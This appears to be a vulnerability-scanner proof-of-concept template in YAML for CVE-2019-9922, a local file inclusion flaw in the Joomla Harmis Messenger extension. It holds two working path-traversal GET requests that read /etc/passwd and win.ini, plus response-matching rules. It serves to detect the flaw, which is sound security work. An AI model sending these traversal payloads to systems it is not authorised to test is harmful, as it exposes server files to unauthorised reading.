name: poc-yaml-joomla-cve-2019-9922-fileread
binding: bef0c7d4-c4c1-476a-833b-9999e1b731ed
manual: true
detail:
    author: Xz
    links:
        - https://github.com/azd-cert/CVE/blob/master/CVEs/CVE-2019-9922.md
        - https://www.cvedetails.com/cve/CVE-2019-9922
        - https://extensions.joomla.org/extension/je-messenger/
        - https://nvd.nist.gov/vuln/detail/CVE-2019-9922
    vulnerability:
        id: CT-2450
        level: high
    description: Joomla! Harmis Messenger 1.2.2 is vulnerable to local file inclusion which could give an attacker read access to arbitrary files.
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /index.php/component/jemessenger/box_details?task=download&dw_file=../../.././../../../etc/passwd
        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
    r1:
        request:
            cache: true
            method: GET
            path: /index.php/component/jemessenger/box_details?task=download&dw_file=../../.././../../../Windows/win.ini
        expression: response.status == 200 && response.body.bcontains(b"for 16-bit app support")
expression: r0() || r1()
